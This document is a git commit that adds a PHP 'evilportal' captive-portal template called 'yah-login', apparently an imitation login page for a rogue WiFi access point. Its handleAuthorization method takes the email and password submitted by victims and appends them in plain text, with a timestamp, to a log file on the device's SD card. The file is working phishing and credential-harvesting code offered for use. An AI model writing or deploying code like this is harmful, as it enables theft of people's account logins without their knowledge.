21a5dc90b91c9e27469d21a28cd56d7611bd0d23
Kleo Bercero <kbeflo@gmail.com>
2017-02-26 03:07:35 +0800

    include yah-login template

---
+++ portals/yah-login/MyPortal.php
@@ -0,0 +1,38 @@
+<?php namespace evilportal;
+
+class MyPortal extends Portal
+{
+
+    public function handleAuthorization()
+    {
+        // Check if evilportal-logs directory exists on sd, if not create directory
+        if (!is_dir('/sd/evilportal-logs/')) {
+
+          mkdir('/sd/evilportal-logs/');
+        }
+        // Append captured data to file on sd
+        // UTC timestamp
+        if (isset($_POST['email'])) {
+            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
+            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
+            file_put_contents("/sd/evilportal-logs/yah-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
+        }
+        // handle form input or other extra things there
+
+        // Call parent to handle basic authorization first
+        parent::handleAuthorization();
+
+    }
+
+    public function showSuccess()
+    {
+        // Calls default success message
+        parent::showSuccess();
+    }
+
+    public function showError()
+    {
+        // Calls default error message
+        parent::showError();
+    }
+}
